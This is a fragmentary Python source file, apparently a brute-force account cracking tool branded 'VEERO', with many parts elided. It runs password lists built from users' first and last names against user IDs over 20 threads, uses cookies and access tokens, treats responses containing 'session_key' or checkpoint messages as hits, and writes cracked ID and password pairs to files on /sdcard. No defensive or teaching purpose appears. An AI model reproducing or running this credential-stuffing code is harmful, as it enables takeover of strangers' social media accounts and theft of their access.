...
class crack_main():
	...
	def crackmail(self,id):
		...
		user=[]
		print(" [*] First Name Example Veero,Azro")
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[VEERO] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[VEERO-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'Please Confirm Email' in po:
					print(' \033[1;32m[VEERO-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/veero_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[VEERO-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/veero_cp.txt','a').write(roid+'|'+pas+'\n')
						break
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/veero_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
...
def new_file(cookies,access_token):
	...
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamVeero, exid,cookies,access_token,sf)
	try:
		son = f"veero{str(random.randint(0,90))}.txt"
	except:
		son = f"veero{str(random.randint(10,50))}.txt"
